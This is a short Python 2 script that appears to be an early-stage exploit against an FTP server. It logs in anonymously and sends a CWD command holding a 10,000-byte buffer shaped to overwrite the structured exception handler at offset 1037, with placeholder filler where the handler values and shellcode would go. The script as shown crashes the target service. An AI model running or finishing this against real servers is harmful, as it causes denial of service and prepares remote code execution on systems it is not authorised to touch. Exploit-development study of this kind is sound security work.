#!/usr/bin/env python
import sys, socket, struct, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()
 
host = sys.argv[1]    
port = int(sys.argv[2])

maxlen = 10000

crash_nseh = 1037
crash_seh = crash_nseh + 4

prefix = "A" * crash_nseh
nseh = "B" * 4
seh = "C" * 4
suffix = "D" * (maxlen - len(prefix + nseh + seh))

payload = prefix + nseh + seh + suffix

print "[+] Connecting to " + host + "\n"

try:
        print "[+] Fuzzing with " + str(len(payload)) + " length message..."

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.recv(1024)
        s.send("USER anonymous\r\n")
        s.recv(1024)
        s.send("PASS hodor\r\n")
        print s.recv(1024)
        s.send("CWD " + payload)
        s.recv(1024)
        s.close()

        time.sleep(0.5)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(payload))
        sys.exit()


